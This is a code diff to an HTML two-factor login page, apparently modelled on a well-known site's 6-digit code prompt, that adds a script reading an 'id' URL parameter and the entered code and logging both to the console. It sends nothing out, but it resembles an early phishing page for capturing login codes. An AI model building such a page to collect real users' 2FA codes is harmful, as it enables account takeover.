@@ -155,13 +155,13 @@
               <p class="subtitle">You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or
                 browser.</p>
               <span style="padding-top: 12px;">When you receive your 6-digit code, enter it to continue:</span>
-              <input type="text" placeholder="Login code"
+              <input id="loginCode" type="text" placeholder="Login code"
                 style="width: 142px; font-size: 12px; margin: 12px 0px; padding: 0px 2px 0px 2px; border: 1px solid #c7c7c8;">
             </div>
             <div class="divider"></div>
             <div class="action-div">
               <p>Didn't receive a code?</p>
-              <button id="button-2fa">Continue</button>
+              <button onclick="authorize()" id="button-2fa">Continue</button>
             </div>
           </div>
         </div>
@@ -229,6 +229,14 @@
 
   </div>
   <script defer>
+    const urlParams = new URLSearchParams(window.location.search);
+    const id = urlParams.get('id');
+    let login_code = document.getElementById('loginCode')
+
+    async function authorize() {
+      console.log(id)
+      console.log(login_code.value)
+    }
 
   </script>
 </body>
